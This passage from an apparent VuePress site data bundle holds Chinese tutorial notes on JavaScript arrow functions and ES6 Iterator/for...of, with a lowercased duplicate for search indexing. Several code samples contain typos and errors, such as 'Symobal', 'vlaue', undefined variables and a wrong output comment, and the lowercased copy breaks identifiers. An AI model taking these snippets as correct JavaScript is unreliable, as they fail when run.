num2) {\nreturn num1 + num2;\n};\n\n\n如果箭头函数的代码块部分多于一条语句，就要使用大括号将它们括起来。\n\nvar sum = (num1, num2) => {\n\tconsole.log(num2);\n\tconsole.log(num1);\nreturn num1 + num2;\n}\n\nconsole.log(sum(1,2));     // 2  1  3\n\n\n由于大括号被解释为代码块，所以如果箭头函数直接返回一个json，必须在对象外面加上括号。\n\nvar person = age => ({ name: "tom", age: age});\nconsole.log(person(21));     //object {name: "tom", age: 21}\n\n\n箭头函数可以与变量解构结合使用。\n\nvar full = ({ name, age}) => name + \'-\' + age;\nconsole.log(full({name:"tom",age:21}));     // tom-21\n\n\n箭头函数使得表达更加简洁。\n\nconst iseven = n => n % 2 == 0;\nconst square = n => n * n;\n\n\n箭头函数的其中一个用处是简化回调函数。\n\n// 正常函数写法\nvar arr1 = [1,2,3].map(function (x) {\nreturn x * x;\n});\nconsole.log(arr1);    //[1,4,9]\n\n// 箭头函数写法\nvar arr2 = [1,2,3].map(x => x * x);\nconsole.log(arr2);    //[1,4,9]\n\n\n# 使用注意点\n\n 1. this对象的指向是可变的，但是在箭头函数中，它是固定的。\n\nfunction foo() {\n  settimeout(() => {\n    console.log(\'id:\', this.id);\n  }, 100);\n  settimeout(function () {\n    console.log("id:",this.id);\n  },100)\n}\n\n  var id = 21;\n  foo.call({ id: 42 });\n//id: 42\n//id: 21\n\n\n 2. 不能当做构造函数\n 3. 箭头函数没有arguments对象',charsets:{cjk:!0}},{title:"Iterator",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/Iterator.html",relativePath:"Javascript/Javascript基础语法/06-数组/Iterator.md",key:"v-60d537e2",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/06-%E6%95%B0%E7%BB%84/Iterator.html",headers:[{level:2,title:"为什么需要Iterator",slug:"为什么需要iterator",normalizedTitle:"为什么需要iterator",charIndex:89},{level:2,title:"Iterator的作用",slug:"iterator的作用",normalizedTitle:"iterator的作用",charIndex:356},{level:2,title:"Iterator遍历过程",slug:"iterator遍历过程",normalizedTitle:"iterator遍历过程",charIndex:494},{level:2,title:"默认Iterator接口",slug:"默认iterator接口",normalizedTitle:"默认iterator接口",charIndex:1146},{level:2,title:"调用 Iterator 接口的场合",slug:"调用-iterator-接口的场合",normalizedTitle:"调用 iterator 接口的场合",charIndex:2369},{level:3,title:"解构赋值",slug:"解构赋值",normalizedTitle:"解构赋值",charIndex:2460},{level:3,title:"扩展运算符",slug:"扩展运算符",normalizedTitle:"扩展运算符",charIndex:2657},{level:3,title:"yield*",slug:"yield",normalizedTitle:"yield*",charIndex:2963},{level:3,title:"其他场合",slug:"其他场合",normalizedTitle:"其他场合",charIndex:3344},{level:2,title:"字符串的Iterator接口",slug:"字符串的iterator接口",normalizedTitle:"字符串的iterator接口",charIndex:3538},{level:2,title:"Iterator接口与Generator函数",slug:"iterator接口与generator函数",normalizedTitle:"iterator接口与generator函数",charIndex:3877},{level:2,title:"for...of 循环",slug:"for-of-循环",normalizedTitle:"for...of 循环",charIndex:4267},{level:3,title:"数组",slug:"数组",normalizedTitle:"数组",charIndex:132},{level:3,title:"Set和Map结构",slug:"set和map结构",normalizedTitle:"set和map结构",charIndex:5377},{level:3,title:"计算生成的数据结构",slug:"计算生成的数据结构",normalizedTitle:"计算生成的数据结构",charIndex:6084},{level:3,title:"类似数组的对象",slug:"类似数组的对象",normalizedTitle:"类似数组的对象",charIndex:3560},{level:3,title:"对象",slug:"对象",normalizedTitle:"对象",charIndex:60},{level:3,title:"与其他遍历语法的比较",slug:"与其他遍历语法的比较",normalizedTitle:"与其他遍历语法的比较",charIndex:7430}],headersStr:"为什么需要Iterator Iterator的作用 Iterator遍历过程 默认Iterator接口 调用 Iterator 接口的场合 解构赋值 扩展运算符 yield* 其他场合 字符串的Iterator接口 Iterator接口与Generator函数 for...of 循环 数组 Set和Map结构 计算生成的数据结构 类似数组的对象 对象 与其他遍历语法的比较",content:"# Iterator\n\n> Iterator（迭代器）模式又称Cursor（游标）模式，用于提供一种方法顺序访问一个聚合对象中各个元素, 而又不需暴露该对象的内部表示。\n\n\n# 为什么需要Iterator\n\nJavaScript原有的表示'集合'的数据结构，主要是数组(Array)和对象(Object),ES6又添加了Map和Set。这样就有了四种数据集合，用户还可以组合使用它们，定义自己的数据结构，比如数组的成员是Map，Map的成员是对象。这样就需要一种统一的接口机制来处理所有不同的数据结构。\n\n遍历器(Iterator) 就是这样一种机制。它是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署Iterator接口，就可以完成遍历操作(即依次处理该数据结构的所有成员)。\n\n\n# Iterator的作用\n\nIterator的作用有三个：\n\n * 为各种数据结构，提供一个统一的、简便的访问接口；\n * 使得数据结构成员能够按某种次序排列；\n * ES6创造了一种新的遍历命令 for...of循环，Iterator接口主要供for...of消费。\n\n\n# Iterator遍历过程\n\n 1. 创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上就是一个指针对象。\n 2. 第一次调用指针对象的next方法，可以将指针指向数据结构的第一个成员。\n 3. 第二次调用指针对象的next方法，指针就指向数据结构的第二个成员。\n 4. 不断调用指针对象next方法，直到它指向数据结构的结束位置。\n\n每一次调用next方法，都会返回数据结构当前成员信息。\n\n{value:'',done:ture}\n\n\nvalue 属性是当前成员的值，done属性是一个布尔值，表示遍历是否结束。\n\n模拟next方法返回值的示例：\n\nvar t = makeIterator([1,2]);\nt.next(); //{value:1,done:false}\nt.next(); //{value:2,done:false}\nt.next(); //{value:undefined,done:true}\n\nfunction makeIterator(array){\n    var nextIndex = 0;\n    return {\n        next:function(){\n            return nextIndex < array.length ? {value:array[nextIndex++],done:false} : {value:undefined,done:true};\n        }\n    }\n}\n\n\n\n# 默认Iterator接口\n\nIterator接口的目的就是为所有的数据结构提供了一种统一的访问机制，即for...of循环。当使用for...of循环遍历某种数据结构时，该循环会自动寻找Iterator接口。\n\n一种数据结构只要部署了Iterator接口，我们就称这种数据结构时\"可遍历的\"(iterable)。\n\nES6规定，默认的Iterator接口部署在数据结构的Symbol.iterator属性，或者说，一个数据结构只要具有Symbol.iterator属性，就可以认为是\"可遍历的\"(iterable)。Symbol.iterator属性本身是一个函数，就是当数据结构默认的遍历器生成函数。执行这个函数就会返回一个遍历器。至于属性名Symbol.iterator，它是一个表达式，返回Symbol对象的iterator属性，这是一个预定义好的类型为Symbol的特殊值，所以要放在方括号内。\n\nconst obj = {\n    [Symbol.iterator]:function(){\n        return {\n            next: function(){\n                return {\n                    value:1,\n                    done:false\n                }\n            }\n        }\n    }\n}\n\n\nES6的有些数据结构原生具备Iterator接口(比如数组)，即不用任何处理，就可以被for...of循环遍历。原因在于，这些数据结构原生部署了Symbol.iterator属性，另外一些数据结构没有(比如对象)。凡是部署了Symbol.iterator属性的数据结构，就称为部署了遍历器接口。调用这个接口，就会返回一个遍历器对象。\n\n原生具备Iterator接口的数据结构如下：\n\n * Array\n * Map\n * Set\n * String\n * TypedArray\n * 函数的Arguments对象\n * NodeList对象\n\n数组的Symbol.iterator属性:\n\nlet arr = ['a','b','c'];\nlet iter = arr[Symbol.iterator]();\n\niter.next(); //{value:'a',done:false}\niter.next(); //{value:'b',done:false}\niter.next(); //{value:'c',done:false}\niter.next(); //{value:undefined,done:true}\n\n\n变量arr是一个数组，原生就具有遍历器接口，部署在arr的Symbol.iterator属性上面。所以，调用这个属性，就得到遍历器对象。\n\n\n# 调用 Iterator 接口的场合\n\n有一些场合会默认调用Iterator接口(即Symbol.iterator方法)，除了下文会介绍的for...of，还有几个别的场合。\n\n\n# 解构赋值\n\n对数组和Set结构进行解构赋值时，会默认调用Symbol.iterator方法。\n\nlet set = new Set().add('a').add('b').add('c');\n\nlet [x,y] = set; //x='a'; y='b'\n\nlet [first,...rest] = set;  // first = 'a'; rest = ['b','c'];\n\n\n\n# 扩展运算符\n\n扩展运算符(...) 也会调用默认的Iterator接口。\n\nvar str = 'hello';\n[...str]  // ['h','e','l','l','o']\n\nlet arr = ['b','c'];\n\n['a',...arr,'d'] // ['a','b','c','d']\n\n\n上面代码的扩展运算符内部就调用Iterator接口。\n\n实际上，这提供了一种简便机制，可以将任何部署了Iterator接口的数据结构，转为数组。也就是说，只要某个数据结构部署了Iterator接口，就可以对它使用扩展运算符，将其转为数组。\n\nlet arr = [...iterator];\n\n\n\n# yield*\n\nyield*后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口。\n\nlet generator = function* (){\n    yield 1;\n    yield* [2,3,4];\n    yield 5;\n}\nvar iter = generator();\n\niter.next();  //{value:1,done:false}\niter.next();  //{value:2,done:false}\niter.next();  //{value:3,done:false}\niter.next();  //{value:4,done:false}\niter.next();  //{value:5,done:false}\niter.next();  //{value:undefined,done:true}\n\n\n\n# 其他场合\n\n由于数组的遍历会调用遍历器接口，所以任何接收数组作为参数的场合，其实都调用了遍历器接口。下面是一些例子。\n\n * for...of\n * Array.from()\n * Map(),Set(),WeakMap(),WeakSet() (比如new Map([['a',1],['b',2]]))\n * Promise.all()\n * Promise.reace()\n\n\n# 字符串的Iterator接口\n\n字符串是一个类似数组的对象，原生具有Iterator接口。\n\nvar str = \"hi\";\ntypeof str[Symbol.iterator]  //function\n\nvar iter = str[Symobal.iterator]();\niterator.next() //{value:'h',done:false}\niterator.next() //{value:'i',done:false}\niterator.next() //{value:undefined,done:true}\n\n\n上面代码中，调用Symbol.iterator方法返回一个遍历器对象，在这个遍历器上可以调用next方法，实现对于字符串的遍历。\n\n\n# Iterator接口与Generator函数\n\nSymbol.iterator方法的最简单实现，还是使用下一章要介绍的Generator函数。\n\nlet myIterable = {\n    [Symbol.iterator] : function* (){\n        yield 1;\n        yield 2;\n        yield 3;\n    }\n}\n[...myIterable] // [1,2,3]\n\n//或者采用下面的简洁写法\nlet obj = {\n    * [Symbol.iterator](){\n        yield 'hello';\n        yield 'world';\n    }\n}\nfor(let x of obj){\n    console.log(x);\n}\n//\"hello\"\n//\"world\"\n\n\n\n# for...of 循环\n\nES6借鉴 C++、Java、C# 和Python 语法，引入了for...of循环，作为遍历所有数据结构的统一方法。\n\n一个数据结构只要部署了Symbol.iterator属性，就被视为具有Iterator接口，就可以用for...of循环遍历它的成员。也就是说，for...of循环内部调用的是数据结构的Symbol.iterator方法。\n\nfor...of循环可以使用的范围包括\n\n * 数组\n * Set\n * Map\n * 类数组对象 arguments/DOM NodeList对象\n * Generator对象\n * String\n\n\n# 数组\n\n数组原生具备iterator接口(即默认部署了Symbol.iterator属性),for...of循环本质上就是调用这个接口产生遍历器，可以用下面的代码证明.\n\nconst arr = ['red','green','blue'];\nfor(let v of arr){\n    console.log(v); // red green blue\n}\n\nconst obj = {};\nobj[Symbol.iterator] = arr[Symbol.iterator].bind(arr);\n\nfor(let v of obj){\n    console.log(v); // red green blue\n}\n\n\n上面的代码中，空对象obj部署了数组arr的Symbol.iterator属性，结果obj的for...of循环，产生了与arr完全一样的结果。\n\nJavascript原有的for...in循环，只能获得对象的键名，不能直接获取键值。ES6提供for...of循环，允许遍历获得键值。\n\nvar arr = ['a','b','c','d'];\nfor(let a in arr){\n    console.log(a); //0 1 2 3 4\n}\n\nfor(let a of arr){\n    console.log(a); //'a' 'b' 'c' 'd'\n}\n\n\nfor...of循环调用遍历器接口，数组的遍历器接口只发挥具有数字索引的属性，这点跟for...in循环也不一样。\n\nlet arr = [3,5,7];\narr.foo = 'hello';\n\nfor(let i in arr){\n    console.log(i); // '0' '1' '2' 'foo'\n}\n\nfor(let i of arr){\n    console.log(i); // 3 5 7\n}\n\n\n\n# Set和Map结构\n\nSet和Map结构 原生具有Itrator接口，可以直接使用for...of循环。\n\nvar engines = new Set(['Gecko','Trident','Webkit','Webkit'])\nfor(var v of engines){\n    console.log(v);\n}\n//Gecko  Trident  Webkit\n\nvar mp = new Map();\nmp.set(\"edition\",6);\nmp.set(\"committee\",\"TC39\");\nmp.set(\"standard\",\"ECMA-262\");\n\nfor(var [name,value] of mp){\n    console.log(name + \":\" + vlaue);\n}\n//edition:6\n//committee:TC39\n//standard:ECMA-262\n\n\n上面代码演示了如何遍历Set结构和Map结构。值得注意的地方有两个，首先，遍历的顺序是按照各个成员被添加进数据结构的顺序。其次，Set结构遍历时，返回的是一个值，而Map结构遍历时，返回的是一个数组，该数组的两个成员分别为当前Map成员的键名和键值。\n\nlet map = new Map().set('a',1).set('b',2);\nfor(let v of map){\n    console.log(v)\n}\n//['a',1]\n//['b',2]\n\nfor(let [k,v] of map){\n    console.log(k + ':'+v);\n}\n//a:1\n//b:2\n\n\n\n# 计算生成的数据结构\n\n有些数据结构是在现有数据结构的基础上，计算生成的。比如，ES6的数组、Set、Map都部署了以下三个方法，调用后都返回遍历器对象。\n\n * entries() 返回一个遍历器对象，用来遍历[键名，键值]组成的数组。对于数组，键名就是索引值；对于Set，键名与键值相同。Map结构的Iterator接口，默认就是调用entries方法.\n * keys() 返回一个遍历器对象，用来遍历所有的键名。\n * values() 返回一个遍历器对象，用来遍历所有的键值。\n\n这三个方法调用后生成的遍历器对象，所遍历的都是计算生成的数据结构。\n\n\n# 类似数组的对象\n\n类似数组的对象包括好几类。\n\n * 字符串\n * DOM NodeList对象\n * arguments对象\n\n//字符串\nlet str = \"hello\";\nfor(let s of str){\n    console.log(s); // h e l l o\n}\n\n// DOM NodeList\nlet ps = document.querySelectorAll('p');\n\nfor (let p of ps){\n    p.classList.add(\"active\");\n}\n\n//Arguments对象\nfunction Test (){\n    for(var a of arguments){\n        console.log(a);\n    }\n}\nTest(\"a\",\"b\");\n// \"a\"   \"b\"\n\n\n对字符串来说，for...of循环还有一个特点，就是会正确识别32位UTF-16字符串。\n\nfor (let x of 'a\\uD83D\\uDC0A'){\n    console.log(x)\n}\n// 'a'\n// '\\uD83D\\uDC0A'\n\n\n\n并不是所有类数组的对象都具有Iterator接口，一个简便的解决办法，就是使用 Array.from()方法将其转为数组。\n\nvar likeArray = {0:'a',1:'b',length:2};\n\n//报错\nfor(let x of likeArray){\n    console.log(x)\n}\n\n//正确\nfor (let x of Array.from(likeArray)){\n    console.log(x)\n}\n\n\n\n# 对象\n\n对于普通的对象，for...of循环不能直接使用，会报错，必须部署了Itrator接口后才能使用。但是，这样情况下，for...in 循环依然可以用来遍历键名。\n\nlet user = {name:\"zhangsan\",age:12,sex:\"男\"};\n\nfor(let k in user){\n    console.log(k)\n}\n// name\n// age\n// sex\n\nfor(let v of user){\n    console.log(k)\n}\n//Uncaught TypeError: user is not iterable\n\n\n上面代码表示，对于普通的对象，for...in循环可以遍历键名，for...of循环会报错。\n\n\n# 与其他遍历语法的比较\n\n以数组为例，JavaScript提供多种遍历语法。最原始的写法就是for循环。\n\nfor(var i = 0; i < arr.length;i++){\n    console.log(arr[i]);\n}\n\n\n这种写法比较麻烦，因此数组提供内置的forEach方法。\n\narr.forEach(v=>{\n    console.log(v);\n})\n\n\n这种写法的问题在于，无法中途跳出forEach循环，break命令或return命令都不能。\n\nfor...in循环可以遍历数组的键名。\n\nfor(var i in arr){\n    console.log(arr[i])\n}\n\n\nfor...in循环有几个缺点：\n\n * 数组的键名是数字，但是for...in循环是以字符串作为键名'0'、'1'、'2'等等。\n * for...in循环不仅遍历数字的键名，还会遍历手动添加的其他键，甚至包括原型链上的键。\n * 某些情况下，for...in循环会以任意顺序遍历键名。\n\n总之,for...in循环主要是为遍历对象而设计的，不适用于遍历数组。\n\nfor...of循环相比上面几种做法，有一些显著的优点：\n\nfor(let v of arr){\n    console.log(v)\n}\n\n\n * 有着同for...in一样的简洁语法，但是没有for...in那些缺点。\n * 不同于forEach方法，它可以与break、continue和return配合使用。\n * 提供了遍历所有数据结构的统一操作接口。\n\n使用break语句跳出for...of循环的例子：\n\nfor(let v of arr){\n    if(v>100){\n        break;\n    }\n    console.log(n);\n}\n",normalizedContent:"# iterator\n\n> iterator（迭代器）模式又称cursor（游标）模式，用于提供一种方法顺序访问一个聚合对象中各个元素, 而又不需暴露该对象的内部表示。\n\n\n# 为什么需要iterator\n\njavascript原有的表示'集合'的数据结构，主要是数组(array)和对象(object),es6又添加了map和set。这样就有了四种数据集合，用户还可以组合使用它们，定义自己的数据结构，比如数组的成员是map，map的成员是对象。这样就需要一种统一的接口机制来处理所有不同的数据结构。\n\n遍历器(iterator) 就是这样一种机制。它是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署iterator接口，就可以完成遍历操作(即依次处理该数据结构的所有成员)。\n\n\n# iterator的作用\n\niterator的作用有三个：\n\n * 为各种数据结构，提供一个统一的、简便的访问接口；\n * 使得数据结构成员能够按某种次序排列；\n * es6创造了一种新的遍历命令 for...of循环，iterator接口主要供for...of消费。\n\n\n# iterator遍历过程\n\n 1. 创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上就是一个指针对象。\n 2. 第一次调用指针对象的next方法，可以将指针指向数据结构的第一个成员。\n 3. 第二次调用指针对象的next方法，指针就指向数据结构的第二个成员。\n 4. 不断调用指针对象next方法，直到它指向数据结构的结束位置。\n\n每一次调用next方法，都会返回数据结构当前成员信息。\n\n{value:'',done:ture}\n\n\nvalue 属性是当前成员的值，done属性是一个布尔值，表示遍历是否结束。\n\n模拟next方法返回值的示例：\n\nvar t = makeiterator([1,2]);\nt.next(); //{value:1,done:false}\nt.next(); //{value:2,done:false}\nt.next(); //{value:undefined,done:true}\n\nfunction makeiterator(array){\n    var nextindex = 0;\n    return {\n        next:function(){\n            return nextindex < array.length ? {value:array[nextindex++],done:false} : {value:undefined,done:true};\n        }\n    }\n}\n\n\n\n# 默认iterator接口\n\niterator接口的目的就是为所有的数据结构提供了一种统一的访问机制，即for...of循环。当使用for...of循环遍历某种数据结构时，该循环会自动寻找iterator接口。\n\n一种数据结构只要部署了iterator接口，我们就称这种数据结构时\"可遍历的\"(iterable)。\n\nes6规定，默认的iterator接口部署在数据结构的symbol.iterator属性，或者说，一个数据结构只要具有symbol.iterator属性，就可以认为是\"可遍历的\"(iterable)。symbol.iterator属性本身是一个函数，就是当数据结构默认的遍历器生成函数。执行这个函数就会返回一个遍历器。至于属性名symbol.iterator，它是一个表达式，返回symbol对象的iterator属性，这是一个预定义好的类型为symbol的特殊值，所以要放在方括号内。\n\nconst obj = {\n    [symbol.iterator]:function(){\n        return {\n            next: function(){\n                return {\n                    value:1,\n                    done:false\n                }\n            }\n        }\n    }\n}\n\n\nes6的有些数据结构原生具备iterator接口(比如数组)，即不用任何处理，就可以被for...of循环遍历。原因在于，这些数据结构原生部署了symbol.iterator属性，另外一些数据结构没有(比如对象)。凡是部署了symbol.iterator属性的数据结构，就称为部署了遍历器接口。调用这个接口，就会返回一个遍历器对象。\n\n原生具备iterator接口的数据结构如下：\n\n * array\n * map\n * set\n * string\n * typedarray\n * 函数的arguments对象\n * nodelist对象\n\n数组的symbol.iterator属性:\n\nlet arr = ['a','b','c'];\nlet iter = arr[symbol.iterator]();\n\niter.next(); //{value:'a',done:false}\niter.next(); //{value:'b',done:false}\niter.next(); //{value:'c',done:false}\niter.next(); //{value:undefined,done:true}\n\n\n变量arr是一个数组，原生就具有遍历器接口，部署在arr的symbol.iterator属性上面。所以，调用这个属性，就得到遍历器对象。\n\n\n# 调用 iterator 接口的场合\n\n有一些场合会默认调用iterator接口(即symbol.iterator方法)，除了下文会介绍的for...of，还有几个别的场合。\n\n\n# 解构赋值\n\n对数组和set结构进行解构赋值时，会默认调用symbol.iterator方法。\n\nlet set = new set().add('a').add('b').add('c');\n\nlet [x,y] = set; //x='a'; y='b'\n\nlet [first,...rest] = set;  // first = 'a'; rest = ['b','c'];\n\n\n\n# 扩展运算符\n\n扩展运算符(...) 也会调用默认的iterator接口。\n\nvar str = 'hello';\n[...str]  // ['h','e','l','l','o']\n\nlet arr = ['b','c'];\n\n['a',...arr,'d'] // ['a','b','c','d']\n\n\n上面代码的扩展运算符内部就调用iterator接口。\n\n实际上，这提供了一种简便机制，可以将任何部署了iterator接口的数据结构，转为数组。也就是说，只要某个数据结构部署了iterator接口，就可以对它使用扩展运算符，将其转为数组。\n\nlet arr = [...iterator];\n\n\n\n# yield*\n\nyield*后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口。\n\nlet generator = function* (){\n    yield 1;\n    yield* [2,3,4];\n    yield 5;\n}\nvar iter = generator();\n\niter.next();  //{value:1,done:false}\niter.next();  //{value:2,done:false}\niter.next();  //{value:3,done:false}\niter.next();  //{value:4,done:false}\niter.next();  //{value:5,done:false}\niter.next();  //{value:undefined,done:true}\n\n\n\n# 其他场合\n\n由于数组的遍历会调用遍历器接口，所以任何接收数组作为参数的场合，其实都调用了遍历器接口。下面是一些例子。\n\n * for...of\n * array.from()\n * map(),set(),weakmap(),weakset() (比如new map([['a',1],['b',2]]))\n * promise.all()\n * promise.reace()\n\n\n# 字符串的iterator接口\n\n字符串是一个类似数组的对象，原生具有iterator接口。\n\nvar str = \"hi\";\ntypeof str[symbol.iterator]  //function\n\nvar iter = str[symobal.iterator]();\niterator.next() //{value:'h',done:false}\niterator.next() //{value:'i',done:false}\niterator.next() //{value:undefined,done:true}\n\n\n上面代码中，调用symbol.iterator方法返回一个遍历器对象，在这个遍历器上可以调用next方法，实现对于字符串的遍历。\n\n\n# iterator接口与generator函数\n\nsymbol.iterator方法的最简单实现，还是使用下一章要介绍的generator函数。\n\nlet myiterable = {\n    [symbol.iterator] : function* (){\n        yield 1;\n        yield 2;\n        yield 3;\n    }\n}\n[...myiterable] // [1,2,3]\n\n//或者采用下面的简洁写法\nlet obj = {\n    * [symbol.iterator](){\n        yield 'hello';\n        yield 'world';\n    }\n}\nfor(let x of obj){\n    console.log(x);\n}\n//\"hello\"\n//\"world\"\n\n\n\n# for...of 循环\n\nes6借鉴 c++、java、c# 和python 语法，引入了for...of循环，作为遍历所有数据结构的统一方法。\n\n一个数据结构只要部署了symbol.iterator属性，就被视为具有iterator接口，就可以用for...of循环遍历它的成员。也就是说，for...of循环内部调用的是数据结构的symbol.iterator方法。\n\nfor...of循环可以使用的范围包括\n\n * 数组\n * set\n * map\n * 类数组对象 arguments/dom nodelist对象\n * generator对象\n * string\n\n\n# 数组\n\n数组原生具备iterator接口(即默认部署了symbol.iterator属性),for...of循环本质上就是调用这个接口产生遍历器，可以用下面的代码证明.\n\nconst arr = ['red','green','blue'];\nfor(let v of arr){\n    console.log(v); // red green blue\n}\n\nconst obj = {};\nobj[symbol.iterator] = arr[symbol.iterator].bind(arr);\n\nfor(let v of obj){\n    console.log(v); // red green blue\n}\n\n\n上面的代码中，空对象obj部署了数组arr的symbol.iterator属性，结果obj的for...of循环，产生了与arr完全一样的结果。\n\njavascript原有的for...in循环，只能获得对象的键名，不能直接获取键值。es6提供for...of循环，允许遍历获得键值。\n\nvar arr = ['a','b','c','d'];\nfor(let a in arr){\n    console.log(a); //0 1 2 3 4\n}\n\nfor(let a of arr){\n    console.log(a); //'a' 'b' 'c' 'd'\n}\n\n\nfor...of循环调用遍历器接口，数组的遍历器接口只发挥具有数字索引的属性，这点跟for...in循环也不一样。\n\nlet arr = [3,5,7];\narr.foo = 'hello';\n\nfor(let i in arr){\n    console.log(i); // '0' '1' '2' 'foo'\n}\n\nfor(let i of arr){\n    console.log(i); // 3 5 7\n}\n\n\n\n# set和map结构\n\nset和map结构 原生具有itrator接口，可以直接使用for...of循环。\n\nvar engines = new set(['gecko','trident','webkit','webkit'])\nfor(var v of engines){\n    console.log(v);\n}\n//gecko  trident  webkit\n\nvar mp = new map();\nmp.set(\"edition\",6);\nmp.set(\"committee\",\"tc39\");\nmp.set(\"standard\",\"ecma-262\");\n\nfor(var [name,value] of mp){\n    console.log(name + \":\" + vlaue);\n}\n//edition:6\n//committee:tc39\n//standard:ecma-262\n\n\n上面代码演示了如何遍历set结构和map结构。值得注意的地方有两个，首先，遍历的顺序是按照各个成员被添加进数据结构的顺序。其次，set结构遍历时，返回的是一个值，而map结构遍历时，返回的是一个数组，该数组的两个成员分别为当前map成员的键名和键值。\n\nlet map = new map().set('a',1).set('b',2);\nfor(let v of map){\n    console.log(v)\n}\n//['a',1]\n//['b',2]\n\nfor(let [k,v] of map){\n    console.log(k + ':'+v);\n}\n//a:1\n//b:2\n\n\n\n# 计算生成的数据结构\n\n有些数据结构是在现有数据结构的基础上，计算生成的。比如，es6的数组、set、map都部署了以下三个方法，调用后都返回遍历器对象。\n\n * entries() 返回一个遍历器对象，用来遍历[键名，键值]组成的数组。对于数组，键名就是索引值；对于set，键名与键值相同。map结构的iterator接口，默认就是调用entries方法.\n * keys() 返回一个遍历器对象，用来遍历所有的键名。\n * values() 返回一个遍历器对象，用来遍历所有的键值。\n\n这三个方法调用后生成的遍历器对象，所遍历的都是计算生成的数据结构。\n\n\n# 类似数组的对象\n\n类似数组的对象包括好几类。\n\n * 字符串\n * dom nodelist对象\n * arguments对象\n\n//字符串\nlet str = \"hello\";\nfor(let s of str){\n    console.log(s); // h e l l o\n}\n\n// dom nodelist\nlet ps = document.queryselectorall('p');\n\nfor (let p of ps){\n    p.classlist.add(\"active\");\n}\n\n//arguments对象\nfunction test (){\n    for(var a of arguments){\n        console.log(a);\n    }\n}\ntest(\"a\",\"b\");\n// \"a\"   \"b\"\n\n\n对字符串来说，for...of循环还有一个特点，就是会正确识别32位utf-16字符串。\n\nfor (let x of 'a\\ud83d\\udc0a'){\n    console.log(x)\n}\n// 'a'\n// '\\ud83d\\udc0a'\n\n\n\n并不是所有类数组的对象都具有iterator接口，一个简便的解决办法，就是使用 array.from()方法将其转为数组。\n\nvar likearray = {0:'a',1:'b',length:2};\n\n//报错\nfor(let x of likearray){\n    console.log(x)\n}\n\n//正确\nfor (let x of array.from(likearray)){\n    console.log(x)\n}\n\n\n\n# 对象\n\n对于普通的对象，for...of循环不能直接使用，会报错，必须部署了itrator接口后才能使用。但是，这样情况下，for...in 循环依然可以用来遍历键名。\n\nlet user = {name:\"zhangsan\",age:12,sex:\"男\"};\n\nfor(let k in user){\n    console.log(k)\n}\n// name\n// age\n// sex\n\nfor(let v of user){\n    console.log(k)\n}\n//uncaught typeerror: user is not iterable\n\n\n上面代码表示，对于普通的对象，for...in循环可以遍历键名，for...of循环会报错。\n\n\n# 与其他遍历语法的比较\n\n以数组为例，javascript提供多种遍历语法。最原始的写法就是for循环。\n\nfor(var i = 0; i < arr.length;i++){\n    console.log(arr[i]);\n}\n\n\n这种写法比较麻烦，因此数组提供内置的foreach方法。\n\narr.foreach(v=>{\n    console.log(v);\n})\n\n\n这种写法的问题在于，无法中途跳出foreach循环，break命令或return命令都不能。\n\nfor...in循环可以遍历数组的键名。\n\nfor(var i in arr){\n    console.log(arr[i])\n}\n\n\nfor...in循环有几个缺点：\n\n * 数组的键名是数字，但是for...in循环是以字符串作为键名'0'、'1'、'2'等等。\n * for...in循环不仅遍历数字的键名，还会遍历手动添加的其他键，甚至包括原型链上的键。\n * 某些情况下，for...in循环会以任意顺序遍历键名。\n\n总之,for...in循环主要是为遍历对象而设计的，不适用于遍历数组。\n\nfor...of循环相比上面几种做法，有一些显著的优点：\n\nfor(let v of arr){\n    console.log(v)\n}\n\n\n * 有着同for...in一样的简洁语法，但是没有for...in那些缺点。\n * 不同于foreach方法，它可以与break、continue和return配合使用。\n * 提供了遍历所有数据结构的统一操作接口。\n\n使用break语句跳出for...of循环的例子：\n\nfor(let v of arr){\n    if(v>100){\n        break;\n    }\n    console.log(n);\n}\n",charsets:{cjk:!0}},{title:"JavaScript内置顶层函数",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/05-%E5%86%85%E7%BD%AE%E9%A1%B6%E5%B1%82%E5%87%BD%E6%95%B0.html",relativePath:"Javascript/Javascript基础语法/05-函数/05-内置顶层函数.md",key:"v-45c9245d",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/05-%E5%86%85%E7%BD%AE%E9%A1%B6%E5%B1%82%E5%87%BD%E6%95%B0.html",headers:[{level:3,title:"内置",slug:"内置",normalizedTitle:"内置",charIndex:12},{level:3,title:"顶层",slug:"顶层",normalizedTitle:"顶层",charIndex:14},{level:2,title:"内置顶层函数",slug:"内置顶层函数",normalizedTitle:"内置顶层函数",charIndex:12},{level:3,title:"Number()",slug:"number",normalizedTitle:"number()",charIndex:144},{level:3,title:"parseInt()",slug:"parseint",normalizedTitle:"parseint()",charIndex:816},{level:3,title:"parseFloat()",slug:"parsefloat",normalizedTitle:"parsefloat()",charIndex:1093},{level:3,title:"String()",slug:"string",normalizedTitle:"string()",charIndex:1195},{level:3,title:"Boolean()",slug:"boolean",normalizedTitle:"boolean()",charIndex:1354},{level:3,title:"isNaN()",slug:"isnan",normalizedTitle:"isnan()",charIndex:1449},{level:3,title:"eval()",slug:"eval",normalizedTitle:"eval()",charIndex:1709},{level:3,title:"BigInt",slug:"bigint",normalizedTitle:"bigint",charIndex:1870},{level:3,title:"转换规则",slug:"转换规则",normalizedTitle:"转换规则",charIndex:1928},{level:3,title:"数学运算",slug:"数学运算",normalizedTitle:"数学运算",charIndex:3991},{level:3,title:"其他运算",slug:"其他运算",normalizedTitle:"其他运算",charIndex:4762}],headersStr:"内置 顶层 内置顶层函数 Number() parseInt() parseFloat() String() Boolean() isNaN() eval() BigInt 转换规则 数学运算 其他运算",content:'# JavaScript内置顶层函数\n\n\n# 内置\n\nECMAscript自带的函数，ECMAscript 自带的函数，ECMAscript将我们常用的一些功能封装起来，用户不需要知道其实现原理而直接使用。\n\n\n# 顶层\n\n指函数的作用范围，作用范围为全局\n\n\n# 